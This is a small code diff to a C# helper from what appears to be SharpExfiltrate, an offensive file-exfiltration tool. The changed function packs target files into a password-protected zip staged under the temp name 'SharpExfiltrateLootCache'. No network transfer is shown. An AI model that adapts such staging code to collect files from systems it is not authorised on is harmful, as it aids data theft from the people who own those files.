@@ -27,8 +27,14 @@ namespace SharpExfiltrate.Helpers
         public static (FileStream fileStream, string TempFilePath, int entryCount) CompressFilesFileStream(string[] filePaths, string password, string rootDirectory = "", int maxFileSize = 0)
         {
             int entryCount = 0;
-            //If we try to store all this in memory we WILL get an out of memory expection, so sadly we have to drop to disk...
+            //If we try to store all this in memory we WILL get an out of memory expection, so we have to drop to disk...
+       
+
             var tempFile = Path.GetTempFileName();
+
+            //You might wanna change/remove this
+            tempFile = tempFile.Replace(Path.GetFileName(tempFile), "SharpExfiltrateLootCache");
+
             var zipFileStream = new FileStream(tempFile, FileMode.Create, FileAccess.ReadWrite, FileShare.None);
 
             using (ZipOutputStream zipStream = new ZipOutputStream(zipFileStream))
@@ -41,8 +47,6 @@ namespace SharpExfiltrate.Helpers
                 {
                     try
                     {
-
-
                         using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read))
                         {
                             if ((fileStream.Length / 1048576.0) <= maxFileSize || maxFileSize == 0)
